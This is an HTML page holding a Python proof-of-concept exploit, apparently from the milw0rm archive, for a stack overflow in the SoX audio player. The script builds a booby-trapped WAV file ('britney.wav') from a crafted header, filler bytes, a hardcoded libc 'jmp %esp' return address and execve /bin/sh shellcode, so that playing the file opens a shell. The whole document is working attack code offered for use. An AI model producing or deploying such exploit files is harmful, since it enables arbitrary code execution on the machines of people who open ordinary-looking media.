<html><head><title>SoX Local Buffer Overflow Exploit</title></head><pre># POC Exploit for SoX Stack Overflow Vulnerability found by Ulf Harnhammar
# Tested Under Slackware 9.1
# Serkan Akpolat sakpolat@gmx.net | deicide@siyahsapka.org
# Homepage: http://deicide.siyahsapka.org
# Greets to: Virulent
# deicide@gate:~$ play britney.wav
# sh-2.05b$

# &quot;jmp %esp&quot; from libc.so , change this if needed..
retJmpEsp=0x4029824B

# intel_order() from MOSDEF
def intel_order(myint):
str=&quot;&quot;
a=chr(myint % 256)
myint=myint &gt;&gt; 8
b=chr(myint % 256)
myint=myint &gt;&gt; 8
c=chr(myint % 256)
myint=myint &gt;&gt; 8
d=chr(myint % 256)
str+=&quot;%c%c%c%c&quot; % (a,b,c,d)
return str

# Wave Header
begin = &quot;\x52\x49\x46\x46\x74\x05\x00\x00\x57\x41\x56\x45\x66\x6d\x74\x20&quot; +\
&quot;\x32\x00\x00\x00\x02\x00\x01\x00\x70\x17\x00\x00\x00\x0c\x00\x00&quot; +\
&quot;\x00\x01\x04\x00\x20\x00\xf4\x01\x07\x00\x00\x01\x00\x00\x00\x02&quot; +\
&quot;\x00\xff\x00\x00\x00\x00\xc0\x00\x40\x00\xf0\x00\x00\x00\xcc\x01&quot; +\
&quot;\x30\xff\x88\x01\x18\xff\x66\x61\x63\x74\x04\x00\x00\x00\x00\x00&quot; +\
&quot;\x00\x00\x64\x61\x74\x61\x00\x00\x00\x00\x4c\x49\x53\x54\x9a\x01&quot; +\
&quot;\x00\x00\x49\x4e\x46\x4f\x49\x41\x52\x54\x08\x00\x00\x00\x44\x65&quot; +\
&quot;\x69\x63\x69\x64\x65\x00\x49\x43\x52\x44\x7e\x01\x00\x00&quot;
shellcode = &quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;

evilBuf = begin+&quot;boom&quot;*75+intel_order(retJmpEsp)+shellcode
wavFile = open(&quot;britney.wav&quot;, &quot;wb&quot;)
wavFile.write(evilBuf)
wavFile.close()
print &quot;Evil Song has been created :Pp&quot;

# milw0rm.com [2004-08-01]</pre></html>